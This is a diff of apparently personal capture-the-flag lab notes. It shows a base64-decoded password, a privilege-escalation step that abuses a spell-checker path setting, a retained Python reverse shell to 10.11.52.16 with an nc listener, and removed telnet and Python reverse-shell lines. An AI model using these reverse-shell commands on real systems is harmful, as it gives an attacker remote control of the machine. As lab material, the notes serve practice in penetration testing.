@@ -297,25 +297,21 @@ Image Description               : eFdpbnRlcjE5OTV4IQ==
 echo 'eFdpbnRlcjE5OTV4IQ==' | base64 -d                                                                 
 xWinter1995x!
 
+
+# Task 4 Privilege Escalation
 search spell
 change Spell engine from google shell --->PSpellShell
  Path to aspellaspellpath  ---> 
  
  
- sh -c '(sleep 4062|telnet 192.168.230.132 4444|while : ; do sh && break; done 2>&1|telnet 192.168.230.132 4444 >/dev/null 2>&1 &)'
- 
- 
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.52.16",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
- 
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect(("10.11.52.16",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
-os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'  
+
 
 on my machine
 nc -lnvp 4445
 
 
-earchsploit 3.13.0                                                                                                               130 ⨯
+searchsploit 3.13.0                                                                                                               130 ⨯
 ---------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                            |  Path
 ---------------------------------------------------------------------------------------------------------- ---------------------------------
